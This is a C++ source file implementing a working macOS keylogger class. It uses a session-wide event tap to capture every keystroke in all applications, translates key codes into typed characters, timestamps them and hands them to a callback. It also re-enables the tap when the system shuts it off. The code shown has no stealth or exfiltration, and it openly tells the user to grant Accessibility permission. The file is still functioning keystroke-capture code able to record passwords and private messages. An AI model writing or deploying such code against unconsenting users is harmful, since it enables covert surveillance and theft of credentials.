#ifdef __APPLE__

#include <Carbon/Carbon.h>

#include <chrono>
#include <cstdio>
#include <future>
#include <iostream>
#include <string>

#include "keylogger_mac.hpp"

// ---- key translation -------------------------------------------------------

static std::string translateKeyCode(CGKeyCode keyCode, CGEventFlags flags) {
    switch (keyCode) {
        case kVK_Space:          return "[SPACE]";
        case kVK_Return:         return "[ENTER]";
        case kVK_Delete:         return "[BACKSPACE]";
        case kVK_Shift:
        case kVK_RightShift:     return "[SHIFT]";
        case kVK_Control:
        case kVK_RightControl:   return "[CTRL]";
        case kVK_Option:
        case kVK_RightOption:    return "[ALT]";
        case kVK_Tab:            return "[TAB]";
        case kVK_Escape:         return "[ESC]";
        case kVK_ForwardDelete:  return "[DELETE]";
        case kVK_Home:           return "[HOME]";
        case kVK_End:            return "[END]";
        case kVK_PageUp:         return "[PGUP]";
        case kVK_PageDown:       return "[PGDN]";
        case kVK_LeftArrow:      return "[LEFT]";
        case kVK_RightArrow:     return "[RIGHT]";
        case kVK_UpArrow:        return "[UP]";
        case kVK_DownArrow:      return "[DOWN]";
        case kVK_CapsLock:       return "[CAPS]";
        case kVK_Command:
        case kVK_RightCommand:   return "[CMD]";
        case kVK_Function:       return "[FN]";
        default: break;
    }

    TISInputSourceRef source = TISCopyCurrentKeyboardInputSource();
    if (!source) {
        char buf[12];
        snprintf(buf, sizeof(buf), "[KC_%02X]", static_cast<unsigned>(keyCode));
        return buf;
    }

    CFDataRef layoutData = static_cast<CFDataRef>(
        TISGetInputSourceProperty(source, kTISPropertyUnicodeKeyLayoutData));
    if (!layoutData) {
        CFRelease(source);
        char buf[12];
        snprintf(buf, sizeof(buf), "[KC_%02X]", static_cast<unsigned>(keyCode));
        return buf;
    }

    const UCKeyboardLayout* layout =
        reinterpret_cast<const UCKeyboardLayout*>(CFDataGetBytePtr(layoutData));

    UInt32 modState = 0;
    if (flags & kCGEventFlagMaskShift)      modState |= (shiftKey >> 8);
    if (flags & kCGEventFlagMaskAlphaShift) modState |= (alphaLock >> 8);

    UInt32 deadKeyState = 0;
    UniChar chars[4] = {};
    UniCharCount len = 0;
    OSStatus status = UCKeyTranslate(layout, keyCode, kUCKeyActionDown, modState,
                                     LMGetKbdType(), kUCKeyTranslateNoDeadKeysBit,
                                     &deadKeyState, 4, &len, chars);
    CFRelease(source);

    if (status == noErr && len > 0 && chars[0] >= 0x20) {
        CFStringRef str = CFStringCreateWithCharacters(kCFAllocatorDefault, chars, len);
        if (str) {
            char utf8[16] = {};
            CFStringGetCString(str, utf8, sizeof(utf8), kCFStringEncodingUTF8);
            CFRelease(str);
            if (utf8[0] != '\0') return std::string(utf8);
        }
    }

    char buf[12];
    snprintf(buf, sizeof(buf), "[KC_%02X]", static_cast<unsigned>(keyCode));
    return buf;
}

// ---- tap callback ----------------------------------------------------------

CGEventRef MacKeylogger::tapCallback(CGEventTapProxy, CGEventType type,
                                     CGEventRef event, void* userInfo) {
    auto* self = static_cast<MacKeylogger*>(userInfo);
    if (!self) return event;

    // Re-enable if the system disabled the tap for being too slow
    if (type == kCGEventTapDisabledByTimeout ||
        type == kCGEventTapDisabledByUserInput) {
        if (self->m_tap) CGEventTapEnable(self->m_tap, true);
        return event;
    }

    CGKeyCode    keyCode = static_cast<CGKeyCode>(
        CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode));
    CGEventFlags flags   = CGEventGetFlags(event);

    KeyEvent ev;
    ev.virtualKey  = keyCode;
    ev.translated  = translateKeyCode(keyCode, flags);
    ev.timestampMs = static_cast<int64_t>(
        std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::system_clock::now().time_since_epoch()).count());
    ev.keyDown = (type == kCGEventKeyDown);

    {
        std::lock_guard<std::mutex> lk(self->m_mu);
        if (self->m_callback) self->m_callback(ev);
    }
    return event;
}

// ---- lifecycle -------------------------------------------------------------

MacKeylogger::~MacKeylogger() { stop(); }

bool MacKeylogger::start() {
    if (m_running.exchange(true)) return true;

    std::promise<bool> ready;
    auto fut = ready.get_future();

    m_thread = std::thread([this, &ready]() {
        CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp);
        m_tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                 kCGEventTapOptionListenOnly, mask, tapCallback, this);
        if (!m_tap) {
            std::cerr << "Failed to create event tap.\n"
                      << "Grant Accessibility permission in:\n"
                      << "System Settings → Privacy & Security → Accessibility\n";
            ready.set_value(false);
            return;
        }

        m_source  = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, m_tap, 0);
        m_runLoop = (CFRunLoopRef)CFRetain(CFRunLoopGetCurrent());
        CFRunLoopAddSource(m_runLoop, m_source, kCFRunLoopDefaultMode);
        CGEventTapEnable(m_tap, true);
        ready.set_value(true);
        CFRunLoopRun();
    });

    bool ok = fut.get();
    if (!ok) {
        m_running = false;
        if (m_thread.joinable()) m_thread.join();
        return false;
    }
    return true;
}

void MacKeylogger::stop() {
    if (!m_running.exchange(false)) return;
    if (m_tap)     CGEventTapEnable(m_tap, false);
    if (m_runLoop) { CFRunLoopStop(m_runLoop); CFRelease(m_runLoop); m_runLoop = nullptr; }
    if (m_thread.joinable()) m_thread.join();
    if (m_source)  { CFRelease(m_source); m_source = nullptr; }
    if (m_tap)     { CFRelease(m_tap);    m_tap    = nullptr; }
}

void MacKeylogger::setEventCallback(std::function<void(const KeyEvent&)> cb) {
    std::lock_guard<std::mutex> lk(m_mu);
    m_callback = std::move(cb);
}

#endif // __APPLE__
